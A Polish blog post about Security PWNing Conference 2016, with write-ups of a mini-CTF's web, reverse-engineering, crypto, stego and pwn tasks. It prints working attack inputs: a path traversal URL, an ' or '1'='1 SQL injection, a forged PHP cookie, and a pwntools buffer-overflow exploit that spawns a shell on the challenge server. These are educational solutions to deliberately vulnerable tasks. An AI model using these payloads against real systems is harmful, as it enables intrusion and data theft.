---
layout:     post
title:      "Security PWNing Conference 2016 oraz CTF od P4"
date:       2016-11-09 16:16:16
tags:       conference, ctf
---

Niedawno wróciłem z [Security PWNing Conference 2016](https://www.instytutpwn.pl/konferencja/pwning2016/) organizowanej przez wydawnictwo PWN oraz Gynvaela Coldwinda. Z całą pewnością można powiedzieć, że to jedna z lepszych konferencji poświęconych tematyce bezpieczeństwa IT w Polsce.

Poza świetnymi prelekcjami, spotkaniem autorskim z autorami książki ["Praktyczna inżynieria wsteczna"](http://ksiegarnia.pwn.pl/Praktyczna-inzynieria-wsteczna,622427233,p.html), lightning talkami (w tym i moim o [unixowych wildcardach](https://docs.google.com/presentation/d/1ielgFWmmKWDNlgXYVgiIy2j1ncGNm43qD47ypzl8VAs/edit?usp=sharing), który prezentowałem również na PyCon PL 2016), after party oraz escape roomem odbył się tam również indywidualny mini CTF (["czym są CTFy"](http://gynvael.coldwind.pl/?id=499)) zorganizowany przez drugą najlepszą drużynę w Polsce (i obecnie 5. na świecie) - P4. Udało mi się zrobić 10 z 13 przygotowanych zadań i tym samym zająć pierwsze miejsce. Jako nagrodę wybrałem książkę "Praktyczna inżynieria wsteczna" i dzięki temu zdobyłem egzemplarz z autografami autorów (zamówiona wcześniej książką nie zdążyła dojść przed konferencją).

Sam CTF dostępny jest na stronie [https://pwning2016.p4.team/](https://pwning2016.p4.team/) -- nie wiem natomiast jak długo tam będzie. Wzięło w nim udział 38 osób, z czego 25 zrobiło przynajmniej jedno zadanie. Pełen ranking przedstawiam poniżej:

![Screen rankingu]({{ site.url }}assets/p4ctf/ranking.png)

Poniżej zamieszczam writeupy z większości zadań.



### Trawersujące koty (Web 50)

Opis: Na naszej hiperbolicznej mapie internetu znaleźliśmy tę mało znaną stronę z kotami. Warto się nią zainteresować, autor twierdzi że jest w posiadaniu flagi.

#### Screen

![Screen strony 'trawersujące koty']({{ site.url }}assets/p4ctf/web50_traveling_cats.png)


#### Rozwiązanie

Nazwa zadania oraz tekst na stronie sugerują, że mamy doczynienia z podatnością typu "path traversal", która polega na niepoprawnej obsłudze ścieżek w programie.

Błąd znajduje się w mechanizmie wyświetlania poszczególnych zdjęć. Zdjęcia linkują do:

[https://cats.pwning2016.p4.team/view.html?file=img/orange-and-white-cat-in-sunbeam.jpg](https://cats.pwning2016.p4.team/view.html?file=img/orange-and-white-cat-in-sunbeam.jpg)


Jak się okazuje, parametr `file` nie jest odpowiednio walidowany po stronie serwera (np. poprzez sprawdzenie, czy bezwzględna ścieżka wynikowa znajduje się w katalogu, który ma przechowywać pliki dostępne dla użytkownika). W związku z tym wystarczy wyjść kilka katalogów do góry zmieniając parametr `file`:

[https://cats.pwning2016.p4.team/view.html?file=../../../../../../../../home/cats/flag.txt](https://cats.pwning2016.p4.team/view.html?file=../../../../../../../../home/cats/flag.txt)

> Uwaga: Tak naprawdę nie wiadomo w jakiej ścieżce na serwerze znajduje się wyświetlana strona internetowa. Z tego powodu, im więcej wykorzystamy `../` tym większe prawdopodobieństwo, że faktycznie dostaniemy się do ścieżki bazowej/początkowej (`/`).

Co daje stronę o poniższym źródle:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>A cat!</title>
</head>
<body>

    <center>
        <img alt = "Embedded Image" src = "data:image/png;base64,cHdue2tvdHkuY3p5Lm5pZSx6YWRhbmllLnpyb2Jpb25lfQo=" />
    </center>
</body>
</html>
```

Skąd widać, że prawdopodobnie kod po stronie serwera czyta obrazek, koduje go w base64, a następnie wrzuca do tagu `img`. Wystarczy zatem zdekodować base64 i w ten sposób otrzymamy zawartość pliku `/home/cats/flag.txt`. Można to zrobić na przykład wykorzystując [interaktywną powłokę do języka Python - IPython](https://programistamag.pl/ipython-wygodna-interaktywna-powloka-pythona/):

```python
In [1]: from base64 import decodestring

In [2]: decodestring 'cHdue2tvdHkuY3p5Lm5pZSx6YWRhbmllLnpyb2Jpb25lfQo='
Out[2]: 'pwn{koty.czy.nie,zadanie.zrobione}\n'
```

---

### Moja pierwsza strona (web 50)
Opis: Znaleźliśmy panel na którym cyberprzestępcy chowają wykradzione przez siebie dane. Przeprowadź atak snajperski i dowiedz się jaką flagę wykradli hackerzy.

#### Screen
![Screen strony 'moja pierwsza strona']({{ site.url }}assets/p4ctf/web50_moja_pierwsza_strona.png)


#### Rozwiązanie
Strona zawiera panel logowania, a tekst na niej sugeruje, że mamy do czynienia z podatnością SQL Injection. Kod po stronie serwera wykonujący zapytanie SQL może wyglądać podobnie do:

```python
username = params['username']
password = params['password']
query = "SELECT username, password FROM users WHERE username='" + username + "' AND password = '" + password + "'"
db.execute(query)
```

Problemem w powyższym zapytaniu jest fakt dołączania wejścia od użytkownika (parametrów username, password) do zapytania bez ich escape'owania (np. zamiany znaku `'` na `\'`, tak, żeby silnik SQL nie potraktował tego znaku jako zakończenie filtru). Poprzez ten błąd, aby zalogować się, wystarczy podać username na `admin` oraz password na `' or '1'='1`, co spowoduje wykonanie takiego zapytania:

```sql
SELECT username, password FROM users WHERE username='admin' AND password = '' or '1'='1'
```

Dzięki czemu zostajemy zalogowani na konto admina i dostajemy flagę:

```
Admin area
Congratulations, you did it , here is your flag pwn{5ql1njecti0nByp@ssMade4@5y}
```

Przy okazji - tego typu błędom można bardzo prosto zapobiec wykorzystując parametryzowane zapytania czy procedury. Niezłą opcją jest również wykorzystywanie [ORMów](https://en.wikipedia.org/wiki/Object-relational_mapping).

---

### Loteria flagowa (web 100)
Opis: Znaleźliśmy w internecie loterię flagową. W zgodzie z ustawą o grach hazardowych zostanie ona zaraz zablokowana, ale spróbuj przed zamknięciem wyciągnąć z niej flagę.

#### Screen

![Screen strony loterii]({{ site.url }}assets/p4ctf/web100_loteria.png)

#### Rozwiązanie
Na stronie znajduje się link "server source", który zwraca źródła aplikacji serwerowej napisanej w NodeJS:

```javascript
var express = require("express");
var app = express();
var expressWs = require('express-ws')(app);
var fs = require("fs");

var flag = fs.readFileSync("../flag").toString();

app.use(express.static('.'));

app.ws('/', function(ws, req) {
	var seed = new Date().valueOf() & 0xFFFFFFFF;
	var rnd = betterRand(seed)
    var userId = new Buffer(seed.toString()+","+rnd.next().value).toString("base64")

    var numbers = Array.from(Array(6)).map(() => Math.floor(rnd.next().value * 89 + 10))

    ws.on('message', function(msg) {
        try {
            var m = JSON.parse(msg.replace("'", '').replace("'", ''));
            var resp = {"numbers": numbers}

            if(JSON.stringify(resp.numbers) === JSON.stringify(m.numbers))
                resp.flag = flag;

            console.log(resp);
            ws.send(JSON.stringify(resp));
        } catch(err) { }

        ws.close()
    });

    console.log("[*] Peer connected!");
    ws.send(JSON.stringify({"userId": userId}))
});

console.log("[*] Listening on port 5555...")
app.listen(5555);

function* betterRand(seed) {
  var m = 25, a = 11, c = 17, z = seed || 3;
  for(;;) yield (z=(a*z+c)%m)/m;
}
```

Powyższy kod tworzy endpoint `/`, który podczas naszego wejścia na stronę wykonuje następujące rzeczy:

* Tworzy seed (z ang. ziarno; czyli stan początkowy dla generatora liczb pseudolosowych zaimplementowanego w funkcji `betterRand`) na podstawie obecnego czasu: `var seed = new Date().valueOf() & 0xFFFFFFFF;`.
* Tworzy obiekt generatora liczb pseudolosowych: `var rnd = betterRand(seed)`.
* Tworzy identyfikator użytkownika - `userId` - na podstawie seeda oraz pierwszej obliczonej wartości z generatora, a następnie kodowany jest kodowaniem base64: `var userId = new Buffer(seed.toString()+","+rnd.next().value).toString("base64")`.
* Oblicza zwycięskie liczby dla danego użytkownika, poprzez "losowanie" (generowanie) kolejnych liczb z generatora `rnd` oraz wykorzystując proste operacje matematyczne: `var numbers = Array.from(Array(6)).map(() => Math.floor(rnd.next().value * 89 + 10))`.
* Następnie rejestrowana jest funkcja, która wykona się gdy wyślemy liczby do loterii (jest to realizowane przez protokół WebSocket): `ws.on('message', function(msg) {...})` - sprawdza ona czy wysłane liczby zgadzają się z tymi, które wcześniej wylosowano - jeżeli tak, to odpowiada flagą.
* Wysyła do klienta JSONa z `userId`: `s.send(JSON.stringify({"userId": userId}))`.

Znajomość implementacji po stronie serwera oraz posiadanie `userId` pozwala nam na wykonanie tych samych obliczeń, które wykonywał serwer podczas generowania zwycięskich liczb dla naszej loterii.

Zróbmy zatem to samo - obliczmy zwycięskie liczby. W tym celu należy najpierw zdekodować `userId` i wyciągnąć wartość `seed` - można to zrobić np. w bashu:

```bash
$ echo MTIxNDc3MjA1NCwwLjQ0 | base64 -d
1214772054,0.44
```

Seed to `1214772054`.

Następnie można zmodyfikować kod JS aby wygenerować liczby do loterii:

```javascript
function* betterRand(seed) {
  var m = 25, a = 11, c = 17, z = seed || 3;
  for(;;) yield (z=(a*z+c)%m)/m;
}

var rnd = betterRand(1214772054);
// losujemy pierwszą liczbę, która była wpisana do userId
rnd.next();
// losujemy liczby do loterii
Array.from(Array(6)).map(() => Math.floor(rnd.next().value * 89 + 10))
```

Wykonanie powyższego kodu - np. w konsoli przeglądarki zwraca:

```javascript
Array [ 56, 45, 17, 59, 84, 91 ]
```

Po wysłaniu tych liczb do loterii dostajemy flagę: `Success! Your flag is pwn{U5e_M0ar_53cuR3_4and0m}`.

---

### Bulletproof login server™ (web 100)

Opis: Panel admina firmy Januszex z Randomia. Nie włamiesz się. Link. https://monk.pwning2016.p4.team Udało nam się znaleźć na śmietniku ich stary dysk twardy z którego odzyskaliśmy część kodu strony.

#### Screen
![Screen strony zadania]({{ site.url }}assets/p4ctf/web100_bulletproof.png)

#### Część kodu strony

```php
<?php

require('../auth_funcs.php');

ini_set('display_errors', 1);
error_reporting(E_ALL);
$auth = false;

if (isset($_COOKIE['remember_me'])) {
    $obj = json_decode($_COOKIE['remember_me'], true);

    if ($obj['login'] == 'demo' && $obj['token'] == getUserAuthToken('demo')) {
        $auth = 'demo';
    }

    if ($obj['login'] == 'admin' && $obj['token'] == getUserAuthToken('admin')) {
        $auth = 'admin';
    }
}

if (!$auth) {
    echo('Sorry, you are not authenticated :(<br>');

    if (isset($_COOKIE['remember_me'])) {
        echo('<pre>'.htmlentities(var_ex
```

#### Rozwiązanie

Błąd wynika z faktu wykorzystania operatora porównania `==` zamiast `===`. Różnica między tymi operatorami w PHP jest dość dobrze opisana w [tym temacie na StackOverflow](http://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp).

Aby dostać flagę, należy zamienić w JSONie (który jest w ciasteczku `remember_me`) pole `login` na `"admin"` oraz pole `token` na `true`. Druga zmiana spowoduje, że string zwracany przez `getUserAuthToken('admin')` zostanie zrzutowany do typu `bool` (a niepusty string jest traktowany jako `true`) więc porównanie zwróci prawdę. Można do tego wykorzystać dowolne lokalne proxy (Burp Suite/Fiddler/ZAProxy) - tak zmodyfikowane żądanie wysyłamy do serwera i otrzymujemy flagę:

![Screen rozwiązania]({{ site.url }}assets/p4ctf/web100_bulletproof_solve.png)

---

### Crack me (re 50)

Opis: Ten program treningowy został stworzony jako test dla nowych cyberżołnierzy. Sprawdź czy jesteś w stanie podołać wyzwaniu. Pliki pobierz stąd.

Program zadania: [crackme50.zip]({{ site.url }}assets/p4ctf/crackme50.zip)

#### Rozwiązanie

Zadanie jest binarką x86 (32-bitową) na platformę Windows:

```
$ file crackme.exe
crackme.exe: PE32 executable (console) Intel 80386, for MS Windows
```

Uruchomienie zadania prosi o flagę oraz pin:

```
λ .\crackme.exe
/*-------------------------------------------------*\
|                   PWNing CTF 2016                 |
\*--------------------------------------------------|
| > Podaj flage i pin: qwe 123
| < Niestety, flaga jest nieprawidlowa
```

Po załadowaniu jej do Ida Pro można bardzo szybko zauważyć instrukcje porównania i wywnioskować, że flaga to `pwn{cr4ck3dm3}`:

![Screen rozwiązania]({{ site.url }}assets/p4ctf/re50_ida.png)

---

### Rex (re 100)

Opis: Otrzymałem od Dyrektora Internetu program sprawdzający czy podany tekst jest poprawną flagą. Niestety, nie jestem w stanie wykorzystać go do odzyskania flagi. Czy jesteś w stanie mi pomóc? Pliki pobierz stąd.

Program zadania: [crackme100.zip]({{ site.url }}assets/p4ctf/crackme100.zip)

#### Rozwiązanie

W tym zadaniu również mamy doczynienia z binarką x86 - ale tym razem na Linuxa:

```
$ file rex32
rex32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2c270454cab6d2e913d9ac9b85aa0b55771b6b0a, stripped
```

Po zdekompilowaniu kodu i zrefaktoryzowaniu nazw (np. w Ida Pro) można dojść do takiego kodu w C:

```C
int __cdecl main()
{
  int result; // eax@11
  int stack_canary_check; // ecx@11
  char is_valid_pwd; // [sp+2h] [bp-76h]@1
  int i; // [sp+4h] [bp-74h]@3
  char password[100]; // [sp+8h] [bp-70h]@1
  int stack_canary; // [sp+6Ch] [bp-Ch]@1

  stack_canary = *MK_FP(__GS__, 20);
  sub_80485AB();
  printf("Password: ");
  fflush(stdout);
  scanf("%s", password);
  is_valid_pwd = 1;
  if ( strlen(password) != dword_804A038 )
    is_valid_pwd = 0;
  for ( i = 0; password[i]; ++i )
  {
    if ( *(_BYTE *)(i + 0x804A03C) != (unsigned __int8)sub_80486D9(password[i]) )
      is_valid_pwd = 0;
  }
  if ( is_valid_pwd )
    puts("Yep!");
  else
    puts("Nope!");
  result = 0;
  stack_canary_check = *MK_FP(__GS__, 20) ^ stack_canary;
  return result;
}
```

Gdzie widać, że to co nas interesuje to odpowiednia długość hasła - zapisana w zmiennej globalnej pod adresem 0x804A038, która jest równa 26:

```
.data:0804A038 dword_804A038   dd 26
```

A następnie kolejne znaki hasła -  porównanie związane z nimi odbywa się w linii:

```
if ( *(_BYTE *)(i + 0x804A03C) != (unsigned __int8)sub_80486D9(password[i]) )
```

Są one (kolejne znaki wprowadzonego hasła) przekazywane do funkcji `sub_80486D9`:

```C
int __cdecl sub_80486D9(unsigned __int8 idx)
{
  sub_80485D7();
  return dword_804A080[idx];
}

unsigned int sub_80485D7()
{
  int v0; // ST18_4@3
  int v1; // ST1C_4@3
  int v2; // ST1C_4@3
  int v3; // ST18_4@3
  int v4; // eax@3
  signed int i; // [sp+4h] [bp-14h]@1

  srand(seed);
  for ( i = 0; i <= 255; ++i )
  {
    v0 = rand();
    v1 = 123 * rand() & 0x1705;
    v2 = rand() + v1;
    v3 = (v2 ^ (v0 % 67 + 3453) ^ 0x355) % 435;
    v4 = rand();
    sub_8048802(
      4
    * ((unsigned __int8)(((unsigned __int64)(v4 + v3) >> 56) + v4 + v3)
     - ((unsigned int)((unsigned __int64)(v4 + v3) >> 32) >> 24))
    + 134520960,
      &dword_804A080[(unsigned __int8)(((unsigned __int64)v2 >> 56) + v2)
                   - ((unsigned int)((unsigned __int64)v2 >> 32) >> 24)]);
  }
  return seed++ + 1;
}
```

Funkcja `sub_80486D9` wykorzystuje dany znak hasła jako indeks w globalnej tablicy `dword_804A080`. Analizując wywoływaną funkcję - `sub_80485D7` (lub też sprawdzając w debugerze) można wywnioskować, że funkcja ta zamienia miejscem wartości w tablicy `dword_804A080`.

Kolejne wartości pobierane z globalnej tablicy (na podstawie znaków przekazanego hasła), są nastepnie porównywane - prawdopodobnie z inną globalną wartością - `*(_BYTE *)(i + 0x804A03C)`.

Powyższe funkcje można by dogłębniej analizować lub/i napisać program łamiący hasło na ich podstawie. Osobiście wykorzystałem analizę dynamiczną - analizując kod asemblera znalazłem instrukcję porównania odpowiadającą linii:

```C
if ( *(_BYTE *)(i + 0x804A03C) != (unsigned __int8)sub_80486D9(password[i]) )
```

Która znajduje się pod adresem 0x080487AD:

```
.text:08048797 call    sub_80486D9
.text:0804879C add     esp, 10h
.text:0804879F mov     [ebp+var_75], al
.text:080487A2 mov     eax, [ebp+var_74]
.text:080487A5 add     eax, 804A03Ch
.text:080487AA movzx   eax, byte ptr [eax]
.text:080487AD cmp     al, [ebp+var_75]     <---- interesujące nas porównanie
.text:080487B0 jz      short loc_80
```

W rejestrze `al` znajduje się wartość z lewej strony porównania (`*(_BYTE *)(i + 0x804A03C)`) a w `[ebp+var_75]` wartość pobrana z globalnej tablicy.

Następnym zadaniem jest znalezienie wartości z rejestru `al` w globalnej tablicy (`dword_804A080`) - szukanie takie można zrobić wykorzystując polecenie `find` - tutaj dla pierwszego znaku hasła (w gdb program jest zatrzymany na instrukcji porównania - na 0x80487AD):

```
(gdb) find 0x804A080, +1024, $al
0x804a240
1 pattern found.
```

Następnie wyciągamy indeks z tej tablicy - to da nam znak hasła:

```
(gdb) print (char) ((0x804a240-0x804A080) / 4)
$3 = 112 'p'
```

Wykonując powyższe dla pozostałych znaków hasła (można to zrobić ustawiając breakpoint na instrukcji porównania oraz kontynuując program w celu przechodzenia do kolejnych znaków), dostajemy flagę - `pwn{rc4_j3st_dl4_b13dnych}`.

---

### Niezłomne szyfrowanie 1 (crypto 50) oraz Niezłomne szyfrowanie 2 (crypto 50)

Opis 1: Dane na naszych dyskach magnetycznych zostały uszkodzone podczas wrogiego ataku DDoS. Odzyskaj klucz użyty do szyfrowania. Pliki pobierz stąd.

Opis 2: Dane na naszych dyskach magnetycznych zostały uszkodzone podczas wrogiego ataku DDoS. Odzyskaj iv użyty do szyfrowania. Pliki pobierz stąd.

Pliki zadania: [crypto50.zip]({{ site.url }}assets/p4ctf/crypto50.zip)

#### Rozwiązanie

Zadanie to wymaga znajomości tego jak działa jeden z trybów pracy szyfrów blokowych - [CBC (Cipher Block Chaining)](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CBC). Należy przeprowadzić atak typu brute force na klucz, a następnie IV:

{% assign openTag = '{%' %}

```python
from Crypto.Cipher import AES
from pwn import *
from string import printable

c = 'b4466001841be7d7d33021c1c644b808452f64ae22e7bbf36842331196b7991c'.decode('hex')
p = 'Is AES really so hard to break??'
tmp = xor(c[:16], p[16:])

def encrypt(plaintext, key, iv):
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.encrypt(plaintext)

def possible_keys():
    k = 'pwn{{openTag}}s%s%s_s3cr3t!}'
    for aaaa in printable:
        for bbbb in printable:
            for cccc in printable:
                yield k % (aaaa, bbbb, cccc)

## CRACK KEY & IV
for key in possible_keys():
    if encrypt(tmp, key, iv='\x00'*16) == c[16:]:
        print "key =", repr(key), key, key.encode('hex'), 'is ok'
        print 'iv =', xor(p[:16], decrypt(c[:16], key, iv='\x00'*16))
```

Uruchomienie skryptu zwraca klucz oraz IV, które są flagami:

```bash
$ python crack_aes.py
key = 'pwn{NS4_s3cr3t!}' pwn{NS4_s3cr3t!} 70776e7b4e53345f733363723374217d is ok
iv = pwn{what_is_iv?}
```

---

### I'm going to space (stegano 50)

Opis: Przechwyciliśmy tę transmisję radiową za pomocą naszych dronów. Na pierwszy rzut oka wygląda jak nagranie z misji apollo 13, ale jesteśmy pewni że jest tu ukryte coś więcej.

Nagranie: [apollo13.zip]({{ site.url }}assets/p4ctf/apollo13.zip)


#### Rozwiązanie

Flaga jest ukryta w spektrogramie. Spektrogram można zobaczyć wykorzystując na przykład program Audacity:

![Apollo1]({{ site.url }}assets/p4ctf/apollo1.png)

![Apollo2]({{ site.url }}assets/p4ctf/apollo2.png)

---

### Nawias się musi zgadzać (pwn 150)

Opis: W ramach programu Nowoczesne Państwo uruchomiliśmy w klastrze cyberbezpieczeństwa usługę pozwalającą sprawdzić czy wyrażenie jest poprawnie onawiasowane. Sprawdź czy Twoje wyrażenia są poprawnie onawiasowane, i nie próbuj się włamywać, bo i tak Ci się to nie uda! Program jest do pobrania stąd.

```
nc pwning2016.p4.team 1337
```

Program: [pwn150.zip]({{ site.url }}assets/p4ctf/pwn150.zip)

#### Rozwiązanie

Tym razem binarka jest x64 na Linuxa:

```
dc@dc:/media/sf_D_DRIVE/p4/pwn150$ file ./brackets
./brackets: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1a898791e079253916e3678874d6f13bd0054743, not stripped
dc@dc:/media/sf_D_DRIVE/p4/pwn150$ ./brackets
Enter expression to check:
((
Missing closing bracket!
dc@dc:/media/sf_D_DRIVE/p4/pwn150$ ./brackets
Enter expression to check:
))
Missing opening bracket!
dc@dc:/media/sf_D_DRIVE/p4/pwn150$ ./brackets
Enter expression to check:
()()
Correct!
```

A zadaniem jest... dostać dostęp do serwera. Po przyjrzeniu się w Ida Pro można zauważyć kilka rzeczy:

* Interesująca funkcja to `check_my_brackets` - widać to w `main`:

```
.text:00000000004006C7 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00000000004006C7 public main
.text:00000000004006C7 main proc near
.text:00000000004006C7 push    rbp
.text:00000000004006C8 mov     rbp, rsp
.text:00000000004006CB mov     edi, offset aEnterExpressio ; "Enter expression to check:"
.text:00000000004006D0 call    _puts
.text:00000000004006D5 mov     eax, 0
.text:00000000004006DA call    check_my_brackets
.text:00000000004006DF mov     edi, offset aCorrect ; "Correct!"
.text:00000000004006E4 call    _puts
.text:00000000004006E9 mov     eax, 0
.text:00000000004006EE pop     rbp
.text:00000000004006EF retn
.text:00000000004006EF main endp
```


* Zadanie jest bardzo ułatwione - binarka zawiera funkcję `shell_me` uruchamiającą `/bin/sh`:

```
.text:00000000004005F6 public shell_me
.text:00000000004005F6 shell_me proc near
.text:00000000004005F6
.text:00000000004005F6 envp= qword ptr -30h
.text:00000000004005F6 argv= qword ptr -20h
.text:00000000004005F6 var_18= qword ptr -18h
.text:00000000004005F6 path= qword ptr -8
.text:00000000004005F6
.text:00000000004005F6 push    rbp
.text:00000000004005F7 mov     rbp, rsp
.text:00000000004005FA sub     rsp, 30h
.text:00000000004005FE mov     [rbp+path], offset aBinSh ; "/bin/sh"
.text:0000000000400606 mov     rax, [rbp+path]
.text:000000000040060A mov     [rbp+argv], rax
.text:000000000040060E mov     [rbp+var_18], 0
.text:0000000000400616 mov     [rbp+envp], 0
.text:000000000040061E lea     rdx, [rbp+envp] ; envp
.text:0000000000400622 lea     rcx, [rbp+argv]
.text:0000000000400626 mov     rax, [rbp+path]
.text:000000000040062A mov     rsi, rcx        ; argv
.text:000000000040062D mov     rdi, rax        ; path
.text:0000000000400630 call    _execve
.text:0000000000400635 nop
.text:0000000000400636 leave
.text:0000000000400637 retn
.text:0000000000400637 shell_me
```

*  Sama logika `check_my_brackets` nie jest bardzo skomplikowana - poniżej kod po dekompilacji i refaktoryzacji:

```C
__int64 check_my_brackets()
{
  __int64 result;       // rax@9
  char buf[112];        // [sp+0h] [bp-80h]@1
  char *ptr;            // [sp+70h] [bp-10h]@1
  int missing_brackets; // [sp+7Ch] [bp-4h]@1

  missing_brackets = 0;
  gets(buf);
  for ( ptr = buf; ; ++ptr )
  {
    result = (unsigned __int8)*ptr;
    if ( !(_BYTE)result )
      break;
    if ( *ptr == '(' )
      ++missing_brackets;
    if ( *ptr == ')' && --missing_brackets < 0 )
    {
      puts("Missing opening bracket!");
      exit(1);
    }
  }
  if ( missing_brackets )
  {
    puts("Missing closing bracket!");
    exit(1);
  }
  return result;
}
```

Wykorzystywana jest tu niebezpieczna funkcja `gets`, która nie weryfikuje w żaden sposób, czy bufor do którego piszemy ma odpowiednio duży rozmiar. Dzięki temu możemy spowodować przepełnienie bufora (wpisać więcej znaków niż faktyczny rozmiar bufora `buf`) i nadpisać wskaźnik powrotu (zapisany adres kolejnej instrukcji, która jest po `call check_my_brackets` w funkcji `main`). W zadaniu brakuje też zabezpieczenia stack canary, co tylko ułatwia (i umożliwia) atak.

Ramka stosu powyższej funkcji wygląda następująco:

```
RBP-0x80 ->  char buf[112]          // 112 Bajtów
RBP-0x10 ->  char *ptr;             // 8 Bajtów
RBP-0x8  ->  char __gap[4];         // 4 Bajty przerwy - IDA nie pokazuje jawnie tej zmiennej
RBP-0x4  ->  int missing_brackets;  // 4 Bajty
RBP      ->  <saved rbp>            // 8 Bajtów - zapisany wskaźnik na początek ramki stosu funkcji main
             <saved rip>            // 8 Bajtów - zapisany wskaźnik powrotu
```

W prosty sposób można obliczyć, że aby nadpisać wskaźnik powrotu, należy podać 112+8+4+4+8 znaków, a następnie nową wartość wskaźnika powrotu. Oczywiście należy pamiętać, że zarówno `ptr` jak i `missing_brackets` muszą mieć odpowiednie wartości, tak aby program nie zakończył działania wykonując funkcję `exit`. W tym przypadku wystarczy je ustawić na 0 (funkcja `gets` nie kończy pobierania znaków, gdy dostanie bajt zerowy).


Exploit napisałem w języku Python wykorzystując niestandardowy moduł `pwntools`, a jego kod wygląda następująco:

```python
#!/usr/bin/env python
#coding utf8

from pwn import *

host = 'pwning2016.p4.team'
port = 1337

r = remote(host, port)
#r = process('./brackets')
#print r.proc.pid
#pause()

shell_me_addr = elf.ELF('./brackets').functions['shell_me'].address

payload = '.' * 112             # buf
payload += p64(0)               # ptr
payload += p32(0)               # gap / przerwa 4B
payload += p32(0)               # missing brackets
payload += p64(0)               # saved rbp
payload += p64(shell_me_addr)   # saved rip

r.send(payload)

r.interactive()
```

Co pozwoliło na zdobycie flagi:

```
dc@dc:/media/sf_D_DRIVE/p4/pwn150$ python crack.py
[+] Opening connection to pwning2016.p4.team on port 1337: Done
[*] '/media/sf_D_DRIVE/p4/pwn150/brackets'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Switching to interactive mode
Enter expression to check:
................................................................................................................^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@�^E@^@^@^@^@^

$ ls
ls
brackets  brackets.c  exploit.py  flag
$ cat flag
cat flag
pwn{b1n4ry_expl01t1ng}
$
[*] Closed connection to pwning2016.p4.team port 1337
```
